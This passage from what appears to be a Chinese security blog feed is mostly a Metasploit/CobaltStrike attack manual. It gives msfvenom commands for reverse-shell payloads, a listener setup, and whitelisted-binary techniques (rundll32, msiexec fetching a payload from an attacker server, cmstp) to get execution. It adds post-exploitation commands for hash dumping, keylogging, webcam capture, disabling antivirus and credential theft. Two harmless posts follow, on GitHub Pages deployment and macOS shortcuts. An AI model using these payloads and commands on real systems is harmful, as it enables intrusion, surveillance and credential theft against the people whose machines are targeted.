文件</span><br><span class="line">-x, --template &lt;path&gt; 指定一个 executable 文件作为模板</span><br><span class="line">-k, --keep payload自动分离并注入到新的进程</span><br><span class="line">-o, --out &lt;path&gt; 存放生成的payload</span><br><span class="line">-v, --var-name &lt;name&gt; 指定自定义变量</span><br><span class="line">--smallest Generate the smallest possible payload</span><br><span class="line">-h, --help 显示帮助文件</span><br></pre></td></tr></table></figure><h3 id="生成-shellcode"><a href="#生成-shellcode" class="headerlink" title="生成 shellcode"></a>生成 shellcode</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c &gt; shellcode.c</span><br></pre></td></tr></table></figure><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c &gt; shellcode.c</span><br></pre></td></tr></table></figure><h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c &gt; shellcode.c</span><br></pre></td></tr></table></figure><h3 id="生成-可执行文件"><a href="#生成-可执行文件" class="headerlink" title="生成 可执行文件"></a>生成 可执行文件</h3><h4 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp</span><br><span class="line">LHOST=攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b <span class="string">&#x27;\x00\x0a\xff&#x27;</span> -i 3 -f exe -o payload.exe</span><br></pre></td></tr></table></figure><h4 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f elf -o payload.elf</span><br></pre></td></tr></table></figure><h4 id="Mac-1"><a href="#Mac-1" class="headerlink" title="Mac"></a>Mac</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f macho -o payload.macho</span><br></pre></td></tr></table></figure><h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://micro8.gitbook.io/micro8/contents-1/1-10/10msfvenom-chang-yong-sheng-cheng-payload-ming-ling">https://micro8.gitbook.io/micro8/contents-1/1-10/10msfvenom-chang-yong-sheng-cheng-payload-ming-ling</a></p></blockquote><h1 id="设置监听上线"><a href="#设置监听上线" class="headerlink" title="设置监听上线"></a>设置监听上线</h1><blockquote><p><strong>Attacker：192.168.31.39</strong></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.31.39</span><br><span class="line">lhost =&gt; 192.168.31.39</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 6666</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.31.39:6666</span><br></pre></td></tr></table></figure><h3 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.39</span> LPORT=<span class="number">6666</span> <span class="operator">-f</span> exe &gt; l.exe</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210704122557.png" alt="image-20210704122557684"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-R67KRMDJ8D3\Pow</span><br></pre></td></tr></table></figure><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.31.39 lport=6666 -f elf &gt; go.elf</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210704160536.png" alt="image-20210704160536688"></p><h2 id="基于白名单上线"><a href="#基于白名单上线" class="headerlink" title="基于白名单上线"></a>基于白名单上线</h2><h3 id="基于白名单-Rundll32-上线"><a href="#基于白名单-Rundll32-上线" class="headerlink" title="基于白名单 Rundll32 上线"></a>基于白名单 Rundll32 上线</h3><p>Rundll32 可以以命令行的方式调用动态链接程序库，执行 DLL 文件中的内部函数</p><h4 id="生成-dll-用于加载上线"><a href="#生成-dll-用于加载上线" class="headerlink" title="生成 dll 用于加载上线"></a>生成 dll 用于加载上线</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.31.39 lport=6666 -f dll &gt; go.dll</span><br></pre></td></tr></table></figure><p>上传 go.dll 到目标服务器，加载 rundll32.exe 运行</p><blockquote><p>rundll32.exe目录：C:\Windows\SysWOW64\rundll32.exe</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 shell32.dll,Control_RunDLL c:\Users\Pow\Desktop\go.dll</span><br></pre></td></tr></table></figure><h4 id="Bypass-执行命令"><a href="#Bypass-执行命令" class="headerlink" title="Bypass 执行命令"></a>Bypass 执行命令</h4><p>开启远程桌面</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">&quot;\..\mshtml.dll,RunHTMLApplication &quot;</span>;eval(<span class="string">&quot;w=new ActiveXObject(\&quot;</span>WScript.Shell\<span class="string">&quot;);w.run(\&quot;</span>mstsc\<span class="string">&quot;);window.close()&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="基于白名单-odbcconf-exe上线"><a href="#基于白名单-odbcconf-exe上线" class="headerlink" title="基于白名单 odbcconf.exe上线"></a>基于白名单 odbcconf.exe上线</h3><p>ODBCCONF.exe 是一种命令行工具，可用于配置 ODBC 驱动程序和数据源的名称。</p><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">odbcconf.exe /a &#123;regsvr C:\Users\Pow\Desktop\<span class="number">6666</span>.dll&#125;</span><br></pre></td></tr></table></figure><h3 id="基于-PsExec-上线"><a href="#基于-PsExec-上线" class="headerlink" title="基于 PsExec 上线"></a>基于 PsExec 上线</h3><blockquote><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p  windows/meterpreter/reverse_tcp LHOST=192.168.31.39 LPORT=6666 -f msi &gt; go.msi</span><br></pre></td></tr></table></figure><p>使用 python 服务器模拟远程 VPS</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe <span class="literal">-d</span> <span class="literal">-s</span> msiexec.exe /q /i http://<span class="number">192.168</span>.<span class="number">31.39</span>:<span class="number">8000</span>/go.msi</span><br></pre></td></tr></table></figure><blockquote><p>缺点：第一次运行会弹窗</p></blockquote><h3 id="基于白名单-Forfiles-远程加载-Payload-上线"><a href="#基于白名单-Forfiles-远程加载-Payload-上线" class="headerlink" title="基于白名单 Forfiles 远程加载 Payload 上线"></a>基于白名单 Forfiles 远程加载 Payload 上线</h3><p>Forfiles 为 Windows 默认安装的文件操作搜索工具之一，可根据日期，后缀名，修改日期为条件。常与批处理配合使用。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles /p c:\windows\system32 /m cmd.exe /c  <span class="string">&quot;msiexec.exe /q /i http://192.168.31.39:8000/go.msi&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>缺点：需要让攻击者手动点击安装，还需要过UAC</p></blockquote><h3 id="基于白名单-Pcalua-上线"><a href="#基于白名单-Pcalua-上线" class="headerlink" title="基于白名单 Pcalua 上线"></a>基于白名单 Pcalua 上线</h3><p>Windows进程兼容性助理(Program Compatibility Assistant)的一个组件。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pcalua <span class="literal">-m</span> <span class="literal">-a</span> l.exe</span><br></pre></td></tr></table></figure><h3 id="基于白名单Cmstp-exe-上线"><a href="#基于白名单Cmstp-exe-上线" class="headerlink" title="基于白名单Cmstp.exe 上线"></a>基于白名单Cmstp.exe 上线</h3><p>新建 l.inf 文件 修改 RegisterOCXSection 为 MSF生成的dll路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[version]</span><br><span class="line">Signature&#x3D;$chicago$</span><br><span class="line">AdvancedINF&#x3D;2.5</span><br><span class="line"> </span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">RegisterOCXs&#x3D;RegisterOCXSection</span><br><span class="line"> </span><br><span class="line">[RegisterOCXSection]</span><br><span class="line">C:\Users\Pow\Desktop\go.dll</span><br><span class="line"> </span><br><span class="line">[Strings]</span><br><span class="line">AppAct &#x3D; &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName&#x3D;&quot;saul&quot;</span><br><span class="line">ShortSvcName&#x3D;&quot;saul&quot;</span><br></pre></td></tr></table></figure><p> 把 go.dll 和 l.inf 上传，运行命令加载上线</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmstp.exe /s l.inf</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://micro8.gitbook.io/micro8/contents-1/71-80">https://micro8.gitbook.io/micro8/contents-1/71-80</a></p></blockquote><h1 id="Meterpreter用例"><a href="#Meterpreter用例" class="headerlink" title="Meterpreter用例"></a>Meterpreter用例</h1><p>刚获得<code>Meterpreter Shell</code>时，该Shell是极其脆弱的，可以把它和目标机中一个稳定的程序绑定</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getpid<span class="comment">#查看当前Meterpreter Shell的进程号</span></span><br><span class="line">ps<span class="comment">#获取目标机正运行的进程</span></span><br><span class="line">migrate 476<span class="comment">#将shell迁移到PID为786的进程中</span></span><br></pre></td></tr></table></figure><h2 id="命令摘要"><a href="#命令摘要" class="headerlink" title="命令摘要"></a>命令摘要</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span>、ls、<span class="built_in">cd</span></span><br><span class="line">getuid<span class="comment">#查看当前权限</span></span><br><span class="line">getsystem<span class="comment">#获得系统管理员权限（要本地管理员权限运行）</span></span><br><span class="line">hashdump<span class="comment">#抓哈希密码</span></span><br><span class="line">sysinfo<span class="comment">#查看系统信息</span></span><br><span class="line">idletim     <span class="comment">#查看目标系统已运行时间</span></span><br><span class="line">route<span class="comment">#查看目标机完整网络设置</span></span><br><span class="line">shell<span class="comment">#进入目标机shell，exit退出she</span></span><br><span class="line">background<span class="comment">#将meterpreter隐藏在后台</span></span><br><span class="line"></span><br><span class="line">upload ./1.txt c:\\1.txt<span class="comment">#上传文件</span></span><br><span class="line">download c:\1.txt ./<span class="comment">#下载文件</span></span><br><span class="line">search -f *.txt -d c://<span class="comment">#搜索文件</span></span><br><span class="line"></span><br><span class="line">keyscan_start<span class="comment">#启动键盘记录</span></span><br><span class="line">keyscan_stop<span class="comment">#停止键盘记录</span></span><br><span class="line">keyscan_dump<span class="comment">#转储键盘记录的内容</span></span><br><span class="line">screenshot<span class="comment">#抓取截屏</span></span><br><span class="line">webcam_list<span class="comment">#摄像头列表</span></span><br><span class="line">webcam_snap<span class="comment">#摄像头拍照</span></span><br><span class="line">webcam_stream<span class="comment">#抓取视频</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Kali-Linux下登录远程桌面</span></span><br><span class="line">sudo rdesktop -f 目标IP</span><br><span class="line"></span><br><span class="line">route add IP 子网掩码    <span class="comment">#添加路由，先background</span></span><br></pre></td></tr></table></figure><h1 id="后渗透模块（Post）"><a href="#后渗透模块（Post）" class="headerlink" title="后渗透模块（Post）"></a>后渗透模块（Post）</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm<span class="comment">#检查目标是否虚拟机</span></span><br><span class="line">run post/linux/gather/checkvm</span><br><span class="line">run post/windows/manage/killav<span class="comment">#关闭杀软</span></span><br><span class="line">run post/windows/manage/enable_rdp<span class="comment">#开启目标远程桌面</span></span><br><span class="line">run post/windows/gather/enum_logged_on_users<span class="comment">#列举当前登陆用户，和最近登陆过的用户</span></span><br><span class="line">run post/windows/gather/enum_applications<span class="comment">#列举应用程序</span></span><br><span class="line">run post/windows/gather/smart_hashdump     <span class="comment">#智能读 hash</span></span><br><span class="line">run windows/gather/credentials/windows_autologin<span class="comment">#列举自动登陆的用户名和密码</span></span><br></pre></td></tr></table></figure><h1 id="派生-Shell-给-CobaltStrike"><a href="#派生-Shell-给-CobaltStrike" class="headerlink" title="派生 Shell 给 CobaltStrike"></a>派生 Shell 给 CobaltStrike</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/<span class="built_in">local</span>/payload_inject</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> LHOST xx.x.x.x  <span class="comment"># CS IP</span></span><br><span class="line"><span class="built_in">set</span> LPORT xx        <span class="comment"># CS http监听端口</span></span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line"><span class="built_in">set</span> DISABLEPAYLOADHANDLER <span class="literal">true</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><h1 id="CS-派生-MSF"><a href="#CS-派生-MSF" class="headerlink" title="CS 派生 MSF"></a>CS 派生 MSF</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> lhost xx.xx.xx.xx</span><br><span class="line"><span class="built_in">set</span> lport xx</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>选择 foreign 类型的监听进行 Spawn，填写MSF 的 IP 和监听端口</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210704223435.png" alt="image-20210704223435428"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MSF-作战手册及联动-CobaltStrike&quot;&gt;&lt;a href=&quot;#MSF-作战手册及联动-CobaltStrike&quot; class=&quot;headerlink&quot; title=&quot;MSF 作战手册及联动 CobaltStrike&quot;&gt;&lt;/a&gt;MSF 作战手册及联动 Co</summary>
      
    
    
    
    <category term="Tools" scheme="https://www.lintstar.top/categories/Tools/"/>
    
    
    <category term="CobaltStrike" scheme="https://www.lintstar.top/tags/CobaltStrike/"/>
    
    <category term="Attack" scheme="https://www.lintstar.top/tags/Attack/"/>
    
    <category term="Metasploit" scheme="https://www.lintstar.top/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>安装 YunYouJun 牌云空调</title>
    <link href="https://www.lintstar.top/2021/05/b5afb4fa.html"/>
    <id>https://www.lintstar.top/2021/05/b5afb4fa.html</id>
    <published>2021-05-10T14:22:22.000Z</published>
    <updated>2021-05-10T18:32:45.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>今天有幸看到了一款精致的云空调：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511002006.png" alt="image-20210511002006017"></p><p><strong>一看链接 <a href="https://ac.yunyoujun.cn/">https://ac.yunyoujun.cn/</a></strong></p><p><strong>职业病点进了 Gayhub 看到了这个好玩的项目：<a href="https://github.com/YunYouJun/air-conditioner/">air-conditioner</a></strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511002408.png" alt="image-20210511002407999"></p><p><strong>主人也很可爱阿： <a href="https://www.yunyoujun.cn/posts/air-conditioner/">https://www.yunyoujun.cn/posts/air-conditioner/</a></strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511011209.png" alt="image-20210511011209845"></p><h1 id="云空调体验馆"><a href="#云空调体验馆" class="headerlink" title="云空调体验馆"></a>云空调体验馆</h1><blockquote><p><strong>❄️ 云空调，便携小空调，为你的夏日带去清凉！</strong></p></blockquote><p><strong>那么它能做什么呢？没错，随时随地打开空调。唯一的缺憾是，没有风。但我们也许可以「望空调止热」。</strong></p><p><strong>欢迎来到空调房：</strong></p><hr><iframe height="740" frameborder="no" src="https://ac.lintstar.top"></iframe><hr><p><strong>这个 iframe 嵌入的 markdown 语法为：</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">height</span>=<span class="string">&quot;740&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://ac.lintstar.top&quot;</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">---</span><br></pre></td></tr></table></figure><blockquote><p><strong>才知道两组 — 包起来 居然可以有这个作用</strong></p></blockquote><p><strong><code>Delivery - 2021</code>  表示该云空调产于 2021 年 ~</strong></p><h1 id="移动款裸机"><a href="#移动款裸机" class="headerlink" title="移动款裸机"></a>移动款裸机</h1><p> <strong><a href="https://ac.lintstar.top/">https://ac.lintstar.top</a></strong></p><h1 id="安装云空调"><a href="#安装云空调" class="headerlink" title="安装云空调"></a>安装云空调</h1><blockquote><p><strong>“ 遵从最宽松的 MIT 协议，你可以自行 <code>clone</code> 本项目，并自定义地构建它 ”</strong></p></blockquote><p><strong>听从云游君的建议 新建了仓库 air-conditioner</strong> </p><p><strong>1. 首先克隆了云游君 master 的仓库 pull 到了自己的 main分支</strong></p><p><strong>2. 新建自己的 workflow</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511013159.png" alt="image-20210511013159308"></p><p><strong>3. 命名为 gh-pages.yml 内容如下</strong></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Github</span> <span class="string">Pages</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">main</span> <span class="comment"># Set a branch name to trigger deployment</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">Node</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&quot;12.x&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Build</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">yarn</span> <span class="string">&amp;&amp;</span> <span class="string">yarn</span> <span class="string">build</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">peaceiris/actions-gh-pages@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">github_token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">publish_dir:</span> <span class="string">./build</span></span><br><span class="line">          <span class="attr">force_orphan:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>坑点是注意分支一定要改成 main 不然 actions 跑不起来</strong></p></blockquote><p><strong>4. 开启 GithubPage 选在 gh-pages 分支</strong></p><p><strong>5. 修改 package.json 的 homepage 同时触发 Actions 安装我们的云空调</strong></p><p><strong>6. 安装成功：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210510234704.png" alt="image-20210510234704543"></p><blockquote><p><strong>触发工作流程详见：<a href="https://docs.github.com/cn/actions/reference/events-that-trigger-workflows">https://docs.github.com/cn/actions/reference/events-that-trigger-workflows</a></strong></p></blockquote><h1 id="解析到子域名"><a href="#解析到子域名" class="headerlink" title="解析到子域名"></a>解析到子域名</h1><blockquote><p><strong>但是这个链接的形式并不快乐</strong> </p><p><strong>目标是把小空调放到子域名 ac.lintstar.top</strong></p></blockquote><p><strong>先把 ac.lintstar.top 解析到主站的 Github Pages</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210510235130.png" alt="image-20210510235130117"></p><p><strong>关键在这里：自定义域允许您从其他域为站点提供服务<a href="http://www.lintstar.top/">www.lintstar.top</a></strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210510235346.png" alt="image-20210510235346406"></p><p><strong>等待域名厂商的 DNS 解析核查通过后勾选 HTTPS</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511001634.png" alt="image-20210511001634035"></p><p><strong>设置成功后 正常解析了：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511001706.png" alt="image-20210511001706388"></p><blockquote><p><strong>解锁了新姿势阿 之前一直以为只能一个 CNAME 解析 感觉又可以有新花样玩了</strong></p></blockquote><p><strong>回到 安装云空调 修改 <a href="https://github.com/lintstar/air-conditioner/blob/main/package.json">package.json</a> 中的 homepage</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511012833.png" alt="image-20210511012833791"></p><p><strong>成功解析到子域名 ~</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511003459.png" alt="image-20210511003459651"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;今天有幸看到了一款精致的云空调：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src= &quot;/img/loading.gif&quot; </summary>
      
    
    
    
    <category term="Fun" scheme="https://www.lintstar.top/categories/Fun/"/>
    
    
    <category term="GithubAction" scheme="https://www.lintstar.top/tags/GithubAction/"/>
    
    <category term="Workflows" scheme="https://www.lintstar.top/tags/Workflows/"/>
    
    <category term="GithubPages" scheme="https://www.lintstar.top/tags/GithubPages/"/>
    
  </entry>
  
  <entry>
    <title>MacOS Big Sur 配置及使用记录</title>
    <link href="https://www.lintstar.top/2021/04/4b5824a3.html"/>
    <id>https://www.lintstar.top/2021/04/4b5824a3.html</id>
    <published>2021-04-20T15:49:59.000Z</published>
    <updated>2021-05-26T03:43:14.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>作为近几年以来变化最大的 macOS 更新，macOS Big Sur 对内置应用的图标、应用的设计语言、桌面的程序坞和菜单栏等方面都进行了重新设计，拟物化的风格深得人心。</strong></p><p><strong>虽说 “BugSur” 的名号不是白来的，但是在我近半年的使用体验来看，暂时没有遇到过实在无法解决的问题，所以还是很推荐有 “余力” 的 Mac 升级 BigSur 的，拥抱新事物总会有令人开心的地方 ~</strong> </p><p><strong>本文会不断记录使用过程中遇到的各种问题，以及能提升幸福感的 macOS 配置。</strong></p><h1 id="Mac-配置"><a href="#Mac-配置" class="headerlink" title="Mac 配置"></a>Mac 配置</h1><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511124753.png" alt="image-20210511124753664"></p><hr><h1 id="系统快捷键"><a href="#系统快捷键" class="headerlink" title="系统快捷键"></a>系统快捷键</h1><table><thead><tr><th>剪切、拷贝、粘贴和其他常用快捷键</th><th></th></tr></thead><tbody><tr><td><code>Command</code> + <code>X</code></td><td>剪切所选项并拷贝到剪贴板</td></tr><tr><td><code>Command</code> + <code>C</code></td><td>将所选项拷贝到剪贴板。这同样适用于“访达”中的文件</td></tr><tr><td><code>Command</code> + <code>V</code></td><td>将剪贴板的内容粘贴到当前文稿或 App 中。这同样适用于“访达”中的文件</td></tr><tr><td><code>Command</code> + 